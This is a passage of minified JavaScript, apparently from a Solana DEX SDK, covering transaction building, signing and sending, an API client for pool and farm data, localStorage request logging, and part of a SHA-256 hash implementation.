                "please provide owner in keypair format or signAllTransactions function"
              );
            },
            extInfo: a || {},
          }
        );
      }
      async buildV0MultiTx(t) {
        var e;
        let { extraPreBuildData: n = [], buildProps: r } = t,
          { transaction: o } = await this.buildV0(r),
          i = n.filter((t) => t.builder.instructions.length > 0),
          s = [o, ...i.map((t) => t.transaction)],
          a = [this.signers, ...i.map((t) => t.signers)],
          u = [
            ...this.instructionTypes,
            ...i.map((t) => t.instructionTypes).flat(),
          ];
        return (
          null != (e = this.owner) &&
            e.signer &&
            a.forEach((t) => {
              t.some((t) => t.publicKey.equals(this.owner.publicKey)) ||
                this.signers.push(this.owner.signer);
            }),
          s.forEach(async (t, e) => {
            t.sign(a[e]);
          }),
          {
            builder: this,
            transactions: s,
            signers: a,
            instructionTypes: u,
            buildProps: r,
            execute: async (t) => {
              var e;
              let {
                sequentially: n,
                onTxUpdate: r,
                recentBlockHash: o,
                skipPreflight: i = !0,
              } = t || {};
              if (
                (o && s.forEach((t) => (t.message.recentBlockhash = o)),
                f_(s),
                null != (e = this.owner) && e.isKeyPair)
              ) {
                if (n) {
                  let t = [];
                  for (let e of s) {
                    let n = await this.connection.sendTransaction(e, {
                      skipPreflight: i,
                    });
                    await s_(this.connection, n), t.push(n);
                  }
                  return { txIds: t, signedTxs: s };
                }
                return {
                  txIds: await Promise.all(
                    s.map(
                      async (t) =>
                        await this.connection.sendTransaction(t, {
                          skipPreflight: i,
                        })
                    )
                  ),
                  signedTxs: s,
                };
              }
              if (this.signAllTransactions) {
                let t = await this.signAllTransactions(s);
                if (n) {
                  let e = 0,
                    n = [],
                    o = async () => {
                      if (!t[e]) return;
                      let s = await this.connection.sendTransaction(t[e], {
                        skipPreflight: i,
                      });
                      n.push({ txId: s, status: "sent", signedTx: t[e] }),
                        null == r || r([...n]),
                        e++;
                      let a = !1,
                        u = null,
                        c = null,
                        l = (t) => {
                          null !== u && clearInterval(u),
                            null !== c &&
                              this.connection.removeSignatureListener(c);
                          let e = n.findIndex((t) => t.txId === s);
                          if (e > -1) {
                            if (
                              "error" === n[e].status ||
                              "success" === n[e].status
                            )
                              return;
                            n[e].status = t.err ? "error" : "success";
                          }
                          null == r || r([...n]), t.err || o();
                        };
                      this.loopMultiTxStatus &&
                        (u = setInterval(async () => {
                          var t;
                          if (a) return clearInterval(u), void 0;
                          try {
                            let e = await this.connection.getTransaction(s, {
                              commitment: "confirmed",
                              maxSupportedTransactionVersion: 0,
                            });
                            e &&
                              ((a = !0),
                              clearInterval(u),
                              l({
                                err:
                                  (null == (t = e.meta) ? void 0 : t.err) ||
                                  null,
                              }),
                              void 0);
                          } catch (e) {
                            (a = !0), clearInterval(u), void 0;
                          }
                        }, j_)),
                        (c = this.connection.onSignature(
                          s,
                          (t) => {
                            if (a)
                              return (
                                this.connection.removeSignatureListener(c),
                                void 0
                              );
                            (a = !0), l(t);
                          },
                          "confirmed"
                        )),
                        this.connection.getSignatureStatus(s);
                    };
                  return o(), { txIds: [], signedTxs: t };
                }
                {
                  let e = [];
                  for (let n = 0; n < t.length; n += 1) {
                    let r = await this.connection.sendTransaction(t[n], {
                      skipPreflight: i,
                    });
                    e.push(r);
                  }
                  return { txIds: e, signedTxs: t };
                }
              }
              throw new Error(
                "please provide owner in keypair format or signAllTransactions function"
              );
            },
            extInfo: r || {},
          }
        );
      }
      async sizeCheckBuild(t) {
        var e;
        let n = t || {},
          { splitIns: r = [], computeBudgetConfig: o } = n,
          i = kA(n, ["splitIns", "computeBudgetConfig"]),
          s = o ? o_(o) : { instructions: [] },
          a = this.signers.reduce(
            (t, e) => AA(vA({}, t), { [e.publicKey.toBase58()]: e }),
            {}
          ),
          u = [],
          c = [],
          l = [],
          d = 0;
        if (
          (this.allInstructions.forEach((t) => {
            let e = [...l, t],
              n = o ? [...s.instructions, ...e] : e,
              i = [
                ...new Set(
                  e
                    .map((t) =>
                      t.keys
                        .filter((t) => t.isSigner)
                        .map((t) => t.pubkey.toString())
                    )
                    .flat()
                ).values(),
              ].map((t) => new Xi(t));
            if (
              t !== r[d] &&
              l.length < 12 &&
              (c_({ instructions: n, payer: this.feePayer, signers: i }) ||
                c_({ instructions: e, payer: this.feePayer, signers: i }))
            )
              l.push(t);
            else {
              if (0 === l.length) throw Error("item ins too big");
              (d += t === r[d] ? 1 : 0),
                c_({
                  instructions: o ? [...s.instructions, ...l] : [...l],
                  payer: this.feePayer,
                  signers: i,
                })
                  ? u.push(new bs().add(...s.instructions, ...l))
                  : u.push(new bs().add(...l)),
                c.push(
                  Array.from(
                    new Set(
                      l
                        .map((t) =>
                          t.keys
                            .filter((t) => t.isSigner)
                            .map((t) => t.pubkey.toString())
                        )
                        .flat()
                    )
                  )
                    .map((t) => a[t])
                    .filter((t) => void 0 !== t)
                ),
                (l = [t]);
            }
          }),
          l.length > 0)
        ) {
          let t = [
            ...new Set(
              l
                .map((t) =>
                  t.keys
                    .filter((t) => t.isSigner)
                    .map((t) => t.pubkey.toString())
                )
                .flat()
            ).values(),
          ]
            .map((t) => a[t])
            .filter((t) => void 0 !== t);
          c_({
            instructions: o ? [...s.instructions, ...l] : [...l],
            payer: this.feePayer,
            signers: t.map((t) => t.publicKey),
          })
            ? u.push(new bs().add(...s.instructions, ...l))
            : u.push(new bs().add(...l)),
            c.push(t);
        }
        return (
          u.forEach((t) => (t.feePayer = this.feePayer)),
          null != (e = this.owner) &&
            e.signer &&
            c.forEach((t) => {
              t.some((t) => t.publicKey.equals(this.owner.publicKey)) ||
                t.push(this.owner.signer);
            }),
          {
            builder: this,
            transactions: u,
            signers: c,
            instructionTypes: this.instructionTypes,
            execute: async (t) => {
              var e;
              let {
                  sequentially: n,
                  onTxUpdate: r,
                  skipTxCount: o = 0,
                  recentBlockHash: i,
                  skipPreflight: s = !0,
                } = t || {},
                a =
                  null != i
                    ? i
                    : await i_(this.connection, this.blockhashCommitment);
              if (
                (u.forEach(async (t, e) => {
                  (t.recentBlockhash = a), c[e].length && t.sign(...c[e]);
                }),
                f_(u),
                null != (e = this.owner) && e.isKeyPair)
              ) {
                if (n) {
                  let t = 0,
                    e = [];
                  for (let n of u) {
                    if ((++t, t <= o)) {
                      e.push("tx skipped");
                      continue;
                    }
                    let r = await Os(
                      this.connection,
                      n,
                      this.signers.find((t) =>
                        t.publicKey.equals(this.owner.publicKey)
                      )
                        ? this.signers
                        : [...this.signers, this.owner.signer],
                      { skipPreflight: s }
                    );
                    e.push(r);
                  }
                  return { txIds: e, signedTxs: u };
                }
                return {
                  txIds: await Promise.all(
                    u.map(
                      async (t) =>
                        await this.connection.sendRawTransaction(
                          t.serialize(),
                          { skipPreflight: s }
                        )
                    )
                  ),
                  signedTxs: u,
                };
              }
              if (this.signAllTransactions) {
                let t = await this.signAllTransactions(u.slice(o, u.length)),
                  e = [...u.slice(0, o), ...t];
                if (n) {
                  let t = 0,
                    n = [],
                    i = async () => {
                      if (!e[t]) return;
                      t < o &&
                        (n.push({
                          txId: "",
                          status: "success",
                          signedTx: e[t],
                        }),
                        null == r || r([...n]),
                        t++,
                        i());
                      let a = await this.connection.sendRawTransaction(
                        e[t].serialize(),
                        { skipPreflight: s }
                      );
                      n.push({ txId: a, status: "sent", signedTx: e[t] }),
                        null == r || r([...n]),
                        t++;
                      let u = !1,
                        c = null,
                        l = null,
                        d = (t) => {
                          null !== c && clearInterval(c),
                            null !== l &&
                              this.connection.removeSignatureListener(l);
                          let e = n.findIndex((t) => t.txId === a);
                          if (e > -1) {
                            if (
                              "error" === n[e].status ||
                              "success" === n[e].status
                            )
                              return;
                            n[e].status = t.err ? "error" : "success";
                          }
                          null == r || r([...n]), t.err || i();
                        };
                      this.loopMultiTxStatus &&
                        (c = setInterval(async () => {
                          var t;
                          if (u) return clearInterval(c), void 0;
                          try {
                            let e = await this.connection.getTransaction(a, {
                              commitment: "confirmed",
                              maxSupportedTransactionVersion: 0,
                            });
                            e &&
                              ((u = !0),
                              clearInterval(c),
                              d({
                                err:
                                  (null == (t = e.meta) ? void 0 : t.err) ||
                                  null,
                              }),
                              void 0);
                          } catch (e) {
                            (u = !0), clearInterval(c), void 0;
                          }
                        }, j_)),
                        (l = this.connection.onSignature(
                          a,
                          (t) => {
                            if (u)
                              return (
                                this.connection.removeSignatureListener(l),
                                void 0
                              );
                            (u = !0), d(t);
                          },
                          "confirmed"
                        )),
                        this.connection.getSignatureStatus(a);
                    };
                  return (
                    await i(), { txIds: n.map((t) => t.txId), signedTxs: e }
                  );
                }
                {
                  let t = [];
                  for (let n = 0; n < e.length; n += 1) {
                    let r = await this.connection.sendRawTransaction(
                      e[n].serialize(),
                      { skipPreflight: s }
                    );
                    t.push(r);
                  }
                  return { txIds: t, signedTxs: e };
                }
              }
              throw new Error(
                "please provide owner in keypair format or signAllTransactions function"
              );
            },
            extInfo: i || {},
          }
        );
      }
      async sizeCheckBuildV0(t) {
        var e;
        let n = t || {},
          {
            computeBudgetConfig: r,
            splitIns: o = [],
            lookupTableCache: i = {},
            lookupTableAddress: s = [],
          } = n,
          a = kA(n, [
            "computeBudgetConfig",
            "splitIns",
            "lookupTableCache",
            "lookupTableAddress",
          ]),
          u = vA(vA({}, "devnet" === this.cluster ? {} : F_), i),
          c = Array.from(new Set([...this.lookupTableAddress, ...s])),
          l = [];
        for (let b of c) void 0 === u[b] && l.push(new Xi(b));
        let d = await z_({ connection: this.connection, address: l });
        for (let [b, v] of Object.entries(d)) u[b] = v;
        let f = r ? o_(r) : { instructions: [] },
          h = await i_(this.connection, this.blockhashCommitment),
          p = this.signers.reduce(
            (t, e) => AA(vA({}, t), { [e.publicKey.toBase58()]: e }),
            {}
          ),
          m = [],
          g = [],
          y = [],
          w = 0;
        if (
          (this.allInstructions.forEach((t) => {
            let e = [...y, t],
              n = r ? [...f.instructions, ...e] : e;
            if (
              t !== o[w] &&
              y.length < 12 &&
              (l_({
                instructions: n,
                payer: this.feePayer,
                lookupTableAddressAccount: u,
              }) ||
                l_({
                  instructions: e,
                  payer: this.feePayer,
                  lookupTableAddressAccount: u,
                }))
            )
              y.push(t);
            else {
              if (0 === y.length) throw Error("item ins too big");
              w += t === o[w] ? 1 : 0;
              for (let t of [...new Set(c)]) void 0 !== u[t] && u[t];
              if (
                r &&
                l_({
                  instructions: [...f.instructions, ...y],
                  payer: this.feePayer,
                  lookupTableAddressAccount: u,
                  recentBlockhash: h,
                })
              ) {
                let t = new vs({
                  payerKey: this.feePayer,
                  recentBlockhash: h,
                  instructions: [...f.instructions, ...y],
                }).compileToV0Message(Object.values(u));
                m.push(new As(t));
              } else {
                let t = new vs({
                  payerKey: this.feePayer,
                  recentBlockhash: h,
                  instructions: [...y],
                }).compileToV0Message(Object.values(u));
                m.push(new As(t));
              }
              g.push(
                Array.from(
                  new Set(
                    y
                      .map((t) =>
                        t.keys
                          .filter((t) => t.isSigner)
                          .map((t) => t.pubkey.toString())
                      )
                      .flat()
                  )
                )
                  .map((t) => p[t])
                  .filter((t) => void 0 !== t)
              ),
                (y = [t]);
            }
          }),
          y.length > 0)
        ) {
          let t = [
            ...new Set(
              y
                .map((t) =>
                  t.keys
                    .filter((t) => t.isSigner)
                    .map((t) => t.pubkey.toString())
                )
                .flat()
            ).values(),
          ]
            .map((t) => p[t])
            .filter((t) => void 0 !== t);
          if (
            r &&
            l_({
              instructions: [...f.instructions, ...y],
              payer: this.feePayer,
              lookupTableAddressAccount: u,
              recentBlockhash: h,
            })
          ) {
            let t = new vs({
              payerKey: this.feePayer,
              recentBlockhash: h,
              instructions: [...f.instructions, ...y],
            }).compileToV0Message(Object.values(u));
            m.push(new As(t));
          } else {
            let t = new vs({
              payerKey: this.feePayer,
              recentBlockhash: h,
              instructions: [...y],
            }).compileToV0Message(Object.values(u));
            m.push(new As(t));
          }
          g.push(t);
        }
        return (
          null != (e = this.owner) &&
            e.signer &&
            g.forEach((t) => {
              t.some((t) => t.publicKey.equals(this.owner.publicKey)) ||
                t.push(this.owner.signer);
            }),
          m.forEach((t, e) => {
            t.sign(g[e]);
          }),
          {
            builder: this,
            transactions: m,
            buildProps: t,
            signers: g,
            instructionTypes: this.instructionTypes,
            execute: async (t) => {
              var e;
              let {
                sequentially: n,
                onTxUpdate: r,
                skipTxCount: o = 0,
                recentBlockHash: i,
                skipPreflight: s = !0,
              } = t || {};
              if (
                (m.map(async (t, e) => {
                  g[e].length && t.sign(g[e]),
                    i && (t.message.recentBlockhash = i);
                }),
                f_(m),
                null != (e = this.owner) && e.isKeyPair)
              ) {
                if (n) {
                  let t = 0,
                    e = [];
                  for (let n of m) {
                    if ((++t, t <= o)) {
                      void 0, e.push("tx skipped");
                      continue;
                    }
                    let r = await this.connection.sendTransaction(n, {
                      skipPreflight: s,
                    });
                    await s_(this.connection, r), e.push(r);
                  }
                  return { txIds: e, signedTxs: m };
                }
                return {
                  txIds: await Promise.all(
                    m.map(
                      async (t) =>
                        await this.connection.sendTransaction(t, {
                          skipPreflight: s,
                        })
                    )
                  ),
                  signedTxs: m,
                };
              }
              if (this.signAllTransactions) {
                let t = await this.signAllTransactions(m.slice(o, m.length)),
                  e = [...m.slice(0, o), ...t];
                if (n) {
                  let t = 0,
                    n = [],
                    i = async () => {
                      if (!e[t]) return;
                      if (t < o)
                        return (
                          n.push({
                            txId: "",
                            status: "success",
                            signedTx: e[t],
                          }),
                          null == r || r([...n]),
                          t++,
                          i(),
                          void 0
                        );
                      let a = await this.connection.sendTransaction(e[t], {
                        skipPreflight: s,
                      });
                      n.push({ txId: a, status: "sent", signedTx: e[t] }),
                        null == r || r([...n]),
                        t++;
                      let u = !1,
                        c = null,
                        l = null,
                        d = (t) => {
                          null !== c && clearInterval(c),
                            null !== l &&
                              this.connection.removeSignatureListener(l);
                          let e = n.findIndex((t) => t.txId === a);
                          if (e > -1) {
                            if (
                              "error" === n[e].status ||
                              "success" === n[e].status
                            )
                              return;
                            n[e].status = t.err ? "error" : "success";
                          }
                          null == r || r([...n]), t.err || i();
                        };
                      this.loopMultiTxStatus &&
                        (c = setInterval(async () => {
                          var t;
                          if (u) return clearInterval(c), void 0;
                          try {
                            let e = await this.connection.getTransaction(a, {
                              commitment: "confirmed",
                              maxSupportedTransactionVersion: 0,
                            });
                            e &&
                              ((u = !0),
                              clearInterval(c),
                              d({
                                err:
                                  (null == (t = e.meta) ? void 0 : t.err) ||
                                  null,
                              }),
                              void 0);
                          } catch (e) {
                            (u = !0), clearInterval(c), void 0;
                          }
                        }, j_)),
                        (l = this.connection.onSignature(
                          a,
                          (t) => {
                            if (u)
                              return (
                                this.connection.removeSignatureListener(l),
                                void 0
                              );
                            (u = !0), d(t);
                          },
                          "confirmed"
                        )),
                        this.connection.getSignatureStatus(a);
                    };
                  return i(), { txIds: [], signedTxs: e };
                }
                {
                  let t = [];
                  for (let n = 0; n < e.length; n += 1) {
                    let r = await this.connection.sendTransaction(e[n], {
                      skipPreflight: s,
                    });
                    t.push(r);
                  }
                  return { txIds: t, signedTxs: e };
                }
              }
              throw new Error(
                "please provide owner in keypair format or signAllTransactions function"
              );
            },
            extInfo: a || {},
          }
        );
      }
    },
    V_ = new Zn(1e6),
    H_ = ((t) => ((t.ALL = "all"), (t.Strict = "strict"), t))(H_ || {}),
    X_ =
      (((K_ = X_ || {}).All = "all"),
      (K_.Standard = "standard"),
      (K_.Concentrated = "concentrated"),
      (K_.AllFarm = "allFarm"),
      (K_.StandardFarm = "standardFarm"),
      (K_.ConcentratedFarm = "concentratedFarm"),
      K_),
    Z_ = {
      BASE_HOST: "https://api-v3.raydium.io",
      OWNER_BASE_HOST: "https://owner-v1.raydium.io",
      SERVICE_BASE_HOST: "https://service.raydium.io",
      MONITOR_BASE_HOST: "https://monitor.raydium.io",
      SERVICE_1_BASE_HOST: "https://service-v1.raydium.io",
      SEND_TRANSACTION: "/send-transaction",
      FARM_ARP: "/main/farm/info",
      FARM_ARP_LINE: "/main/farm-apr-tv",
      CLMM_CONFIG: "/main/clmm-config",
      CPMM_CONFIG: "/main/cpmm-config",
      VERSION: "/main/version",
      CHECK_AVAILABILITY: "/v3/main/AvailabilityCheckAPI",
      RPCS: "/main/rpcs",
      INFO: "/main/info",
      STAKE_POOLS: "/main/stake-pools",
      CHAIN_TIME: "/main/chain-time",
      TOKEN_LIST: "/mint/list",
      MINT_INFO_ID: "/mint/ids",
      JUP_TOKEN_LIST: "https://lite-api.jup.ag/tokens/v1/tagged/verified",
      POOL_LIST: "/pools/info/list",
      POOL_SEARCH_BY_ID: "/pools/info/ids",
      POOL_SEARCH_MINT: "/pools/info/mint",
      POOL_SEARCH_LP: "/pools/info/lps",
      POOL_KEY_BY_ID: "/pools/key/ids",
      POOL_LIQUIDITY_LINE: "/pools/line/liquidity",
      POOL_POSITION_LINE: "/pools/line/position",
      FARM_INFO: "/farms/info/ids",
      FARM_LP_INFO: "/farms/info/lp",
      FARM_KEYS: "/farms/key/ids",
      OWNER_CREATED_FARM: "/create-pool/{owner}",
      OWNER_IDO: "/main/ido/{owner}",
      OWNER_STAKE_FARMS: "/position/stake/{owner}",
      OWNER_LOCK_POSITION: "/position/clmm-lock/{owner}",
      IDO_KEYS: "/ido/key/ids",
      SWAP_HOST: "https://transaction-v1.raydium.io",
      SWAP_COMPUTE: "/compute/",
      SWAP_TX: "/transaction/",
      MINT_PRICE: "/mint/price",
      MIGRATE_CONFIG: "/main/migrate-lp",
      PRIORITY_FEE: "/main/auto-fee",
      CPMM_LOCK: "https://dynamic-ipfs.raydium.io/lock/cpmm/position",
    };
  vA({}, Z_);
  var J_ = "ray_tab_hash",
    Y_ = "ray_req_hash",
    Q_ = () => {
      if (void 0 === typeof window) return "";
      let t = sessionStorage.getItem(J_);
      return t || ((t = `ray-${Date.now()}`), sessionStorage.setItem(J_, t)), t;
    },
    $_ = async (t) => {
      var e = t,
        { logCount: n = 1e3, removeLastLog: r } = e,
        o = kA(e, ["logCount", "removeLastLog"]);
      if (void 0 === typeof window) return new Promise((t) => t());
      let i = JSON.parse(localStorage.getItem(Y_) || "[]").slice(0, n - 1);
      r && i.pop(),
        new Blob([JSON.stringify(o.data)]).size > 1024 &&
          (o.data = JSON.stringify(o.data).substring(0, 200) + "..."),
        i.unshift(AA(vA({}, o), { time: Date.now(), session: Q_() }));
      try {
        localStorage.setItem(Y_, JSON.stringify(i));
      } catch {
        if (r) {
          let t = !1,
            e = JSON.stringify(o.data).substring(0, 100);
          for (i[0].data = e + (e.length > 100 ? "..." : ""); !t; ) {
            i.pop();
            let e = JSON.stringify(o.data).substring(0, 100);
            i[0].data = e + (e.length > 100 ? "..." : "");
            try {
              localStorage.setItem(Y_, JSON.stringify(i)), (t = !0);
            } catch {
              t = !1;
            }
          }
          return new Promise((t) => t());
        }
        return $_(AA(vA({}, o), { logCount: n, removeLastLog: !0 }));
      }
    },
    tT = CA("Raydium_Api"),
    eT = new Map(),
    nT = class {
      constructor({
        cluster: t,
        timeout: e,
        logRequests: n,
        logCount: r,
        urlConfigs: o,
      }) {
        (this.cluster = t),
          (this.urlConfigs = o || {}),
          (this.logCount = r || 1e3),
          (this.api = Jb.create({
            baseURL: this.urlConfigs.BASE_HOST || Z_.BASE_HOST,
            timeout: e,
          })),
          this.api.interceptors.request.use(
            (t) => {
              let { method: e, baseURL: n, url: r } = t;
              return (
                tT.debug(`${null == e ? void 0 : e.toUpperCase()} ${n}${r}`), t
              );
            },
            (t) => (tT.error("Request failed"), Promise.reject(t))
          ),
          this.api.interceptors.response.use(
            (t) => {
              let { config: e, data: r, status: o } = t,
                { method: i, baseURL: s, url: a } = e;
              return (
                n &&
                  $_({
                    status: o,
                    url: `${s}${a}`,
                    params: e.params,
                    data: r,
                    logCount: this.logCount,
                  }),
                tT.debug(
                  `${null == i ? void 0 : i.toUpperCase()} ${s}${a}  ${o}`
                ),
                r
              );
            },
            (t) => {
              let { config: e, response: r = {} } = t,
                { status: o } = r,
                { method: i, baseURL: s, url: a } = e;
              return (
                n &&
                  $_({
                    status: o,
                    url: `${s}${a}`,
                    params: e.params,
                    data: t.message,
                    logCount: this.logCount,
                  }),
                tT.error(`${i.toUpperCase()} ${s}${a} ${o || t.message}`),
                Promise.reject(t)
              );
            }
          );
      }
      async getClmmConfigs() {
        return (
          await this.api.get(this.urlConfigs.CLMM_CONFIG || Z_.CLMM_CONFIG)
        ).data;
      }
      async getCpmmConfigs() {
        return (
          await this.api.get(this.urlConfigs.CPMM_CONFIG || Z_.CPMM_CONFIG)
        ).data;
      }
      async getClmmPoolLines(t) {
        return (
          await this.api.get(
            `${
              this.urlConfigs.POOL_LIQUIDITY_LINE || Z_.POOL_LIQUIDITY_LINE
            }?pool_id=${t}`
          )
        ).data;
      }
      async getBlockSlotCountForSecond(t) {
        if (!t) return 2;
        let e = (
          await Jb.post(t, {
            id: "getRecentPerformanceSamples",
            jsonrpc: "2.0",
            method: "getRecentPerformanceSamples",
            params: [4],
          })
        ).result.map((t) => t.numSlots);
        return e.reduce((t, e) => t + e, 0) / e.length / 60;
      }
      async getChainTimeOffset() {
        return (await this.api.get(this.urlConfigs.CHAIN_TIME || Z_.CHAIN_TIME))
          .data;
      }
      async getRpcs() {
        return this.api.get(this.urlConfigs.RPCS || Z_.RPCS);
      }
      async getTokenList() {
        return (await this.api.get(this.urlConfigs.TOKEN_LIST || Z_.TOKEN_LIST))
          .data;
      }
      async getJupTokenList() {
        return (
          await this.api.get("", {
            baseURL: this.urlConfigs.JUP_TOKEN_LIST || Z_.JUP_TOKEN_LIST,
          })
        ).map((t) =>
          AA(vA({}, t), {
            chainId: 101,
            programId: t.tags.includes("token-2022")
              ? Tc.toBase58()
              : _c.toBase58(),
          })
        );
      }
      async getTokenInfo(t) {
        return (
          await this.api.get(
            (this.urlConfigs.MINT_INFO_ID || Z_.MINT_INFO_ID) +
              `?mints=${t.map((t) => t.toString()).join(",")}`
          )
        ).data;
      }
      async getPoolList(t = {}) {
        let {
          type: e = "all",
          sort: n = "liquidity",
          order: r = "desc",
          page: o = 0,
          pageSize: i = 100,
        } = t;
        return (
          await this.api.get(
            (this.urlConfigs.POOL_LIST || Z_.POOL_LIST) +
              `?poolType=${e}&poolSortField=${n}&sortType=${r}&page=${o}&pageSize=${i}`
          )
        ).data;
      }
      async fetchPoolById(t) {
        let { ids: e } = t;
        return (
          await this.api.get(
            (this.urlConfigs.POOL_SEARCH_BY_ID || Z_.POOL_SEARCH_BY_ID) +
              `?ids=${e}`
          )
        ).data;
      }
      async fetchPoolKeysById(t) {
        let { idList: e } = t,
          n = [],
          r = e.filter((t) => !eT.has(t) || (n.push(eT.get(t)), !1)),
          o = [];
        return (
          r.length &&
            ((o = (
              await this.api.get(
                (this.urlConfigs.POOL_KEY_BY_ID || Z_.POOL_KEY_BY_ID) +
                  `?ids=${r.join(",")}`
              )
            ).data.filter(Boolean)),
            o.forEach((t) => {
              eT.set(t.id, t);
            })),
          n.concat(o)
        );
      }
      async fetchPoolByMints(t) {
        let {
            mint1: e,
            mint2: n,
            type: r = "all",
            sort: o = "default",
            order: i = "desc",
            page: s = 1,
          } = t,
          [a, u] = [
            e && FI(e).toBase58(),
            n && "undefined" !== n ? FI(n).toBase58() : "",
          ],
          [c, l] = u && a > u ? [u, a] : [a, u];
        return (
          await this.api.get(
            (this.urlConfigs.POOL_SEARCH_MINT || Z_.POOL_SEARCH_MINT) +
              `?mint1=${c}&mint2=${l}&poolType=${r}&poolSortField=${o}&sortType=${i}&pageSize=100&page=${s}`
          )
        ).data;
      }
      async fetchFarmInfoById(t) {
        let { ids: e } = t;
        return (
          await this.api.get(
            (this.urlConfigs.FARM_INFO || Z_.FARM_INFO) + `?ids=${e}`
          )
        ).data;
      }
      async fetchFarmKeysById(t) {
        let { ids: e } = t;
        return (
          await this.api.get(
            (this.urlConfigs.FARM_KEYS || Z_.FARM_KEYS) + `?ids=${e}`
          )
        ).data;
      }
      async fetchAvailabilityStatus() {
        return (
          await this.api.get(
            this.urlConfigs.CHECK_AVAILABILITY || Z_.CHECK_AVAILABILITY
          )
        ).data;
      }
    },
    rT =
      "please provide owner in load() initialization or you can set by calling raydium.setOwner(owner)",
    oT = (...t) =>
      t
        .map((t) => {
          try {
            return "object" == typeof t ? JSON.stringify(t) : t;
          } catch {
            return t;
          }
        })
        .join(", "),
    iT = class {
      constructor({ scope: t, moduleName: e }) {
        (this.disabled = !1), (this.scope = t), (this.logger = CA(e));
      }
      createTxBuilder(t) {
        return (
          this.scope.checkOwner(),
          new G_({
            connection: this.scope.connection,
            feePayer: t || this.scope.ownerPubKey,
            cluster: this.scope.cluster,
            owner: this.scope.owner,
            blockhashCommitment: this.scope.blockhashCommitment,
            loopMultiTxStatus: this.scope.loopMultiTxStatus,
            api: this.scope.api,
            signAllTransactions: this.scope.signAllTransactions,
          })
        );
      }
      logDebug(...t) {
        this.logger.debug(oT(t));
      }
      logInfo(...t) {
        this.logger.info(oT(t));
      }
      logAndCreateError(...t) {
        let e = oT(t);
        throw new Error(e);
      }
      checkDisabled() {
        (this.disabled || !this.scope) &&
          this.logAndCreateError("module not working");
      }
    };
  function sT(t, ...e) {
    if (
      !(function (t) {
        return (
          t instanceof Uint8Array ||
          (null != t &&
            "object" == typeof t &&
            "Uint8Array" === t.constructor.name)
        );
      })(t)
    )
      throw new Error("Uint8Array expected");
    if (e.length > 0 && !e.includes(t.length))
      throw new Error(
        `Uint8Array expected of length ${e}, not of length=${t.length}`
      );
  }
  function aT(t, e = !0) {
    if (t.destroyed) throw new Error("Hash instance has been destroyed");
    if (e && t.finished)
      throw new Error("Hash#digest() has already been called");
  }
  var uT = (t) => new DataView(t.buffer, t.byteOffset, t.byteLength),
    cT = (t, e) => (t << (32 - e)) | (t >>> e);
  function lT(t) {
    return (
      "string" == typeof t &&
        (t = (function (t) {
          if ("string" != typeof t)
            throw new Error("utf8ToBytes expected string, got " + typeof t);
          return new Uint8Array(new TextEncoder().encode(t));
        })(t)),
      sT(t),
      t
    );
  }
  68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0];
  var dT = class {
    clone() {
      return this._cloneInto();
    }
  };
  var fT = (t, e, n) => (t & e) ^ (~t & n),
    hT = (t, e, n) => (t & e) ^ (t & n) ^ (e & n),
    pT = class extends dT {
      constructor(t, e, n, r) {
        super(),
          (this.blockLen = t),
          (this.outputLen = e),
          (this.padOffset = n),
          (this.isLE = r),
          (this.finished = !1),
          (this.length = 0),
          (this.pos = 0),
          (this.destroyed = !1),
          (this.buffer = new Uint8Array(t)),
          (this.view = uT(this.buffer));
      }
      update(t) {
        aT(this);
        let { view: e, buffer: n, blockLen: r } = this,
          o = (t = lT(t)).length;
        for (let i = 0; i < o; ) {
          let s = Math.min(r - this.pos, o - i);
          if (s === r) {
            let e = uT(t);
            for (; r <= o - i; i += r) this.process(e, i);
            continue;
          }
          n.set(t.subarray(i, i + s), this.pos),
            (this.pos += s),
            (i += s),
            this.pos === r && (this.process(e, 0), (this.pos = 0));
        }
        return (this.length += t.length), this.roundClean(), this;
      }
      digestInto(t) {
        aT(this),
          (function (t, e) {
            sT(t);
            let n = e.outputLen;
            if (t.length < n)
              throw new Error(
                `digestInto() expects output buffer of length at least ${n}`
              );
          })(t, this),
          (this.finished = !0);
        let { buffer: e, view: n, blockLen: r, isLE: o } = this,
          { pos: i } = this;
        (e[i++] = 128),
          this.buffer.subarray(i).fill(0),
          this.padOffset > r - i && (this.process(n, 0), (i = 0));
        for (let l = i; l < r; l++) e[l] = 0;
        (function (t, e, n, r) {
          if ("function" == typeof t.setBigUint64)
            return t.setBigUint64(e, n, r);
          let o = BigInt(32),
            i = BigInt(4294967295),
            s = Number((n >> o) & i),
            a = Number(n & i),
            u = r ? 4 : 0,
            c = r ? 0 : 4;
          t.setUint32(e + u, s, r), t.setUint32(e + c, a, r);
        })(n, r - 8, BigInt(8 * this.length), o),
          this.process(n, 0);
        let s = uT(t),
          a = this.outputLen;
        if (a % 4)
          throw new Error("_sha2: outputLen should be aligned to 32bit");
        let u = a / 4,
          c = this.get();
        if (u > c.length) throw new Error("_sha2: outputLen bigger than state");
        for (let l = 0; l < u; l++) s.setUint32(4 * l, c[l], o);
      }
      digest() {
        let { buffer: t, outputLen: e } = this;
        this.digestInto(t);
        let n = t.slice(0, e);
        return this.destroy(), n;
      }
      _cloneInto(t) {
        t || (t = new this.constructor()), t.set(...this.get());
        let {
          blockLen: e,
          buffer: n,
          length: r,
          finished: o,
          destroyed: i,
          pos: s,
        } = this;
        return (
          (t.length = r),
          (t.pos = s),
          (t.finished = o),
          (t.destroyed = i),
          r % e && t.buffer.set(n),
          t
        );
      }
    },
    mT = new Uint32Array([
      1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993,
      2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987,
      1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774,
      264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986,
      2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711,
      113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291,
      1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411,
      3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344,
      430227734, 506948616, 659060556, 883997877, 958139571, 1322822218,
      1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424,
      2428436474, 2756734187, 3204031479, 3329325298,
    ]),
    gT = new Uint32Array([
      1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924,
      528734635, 1541459225,
    ]),
    yT = new Uint32Array(64),
    wT = class extends pT {
      constructor() {
        super(64, 32, 8, !1),
          (this.A = 0 | gT[0]),
          (this.B = 0 | gT[1]),
          (this.C = 0 | gT[2]),
          (this.D = 0 | gT[3]),
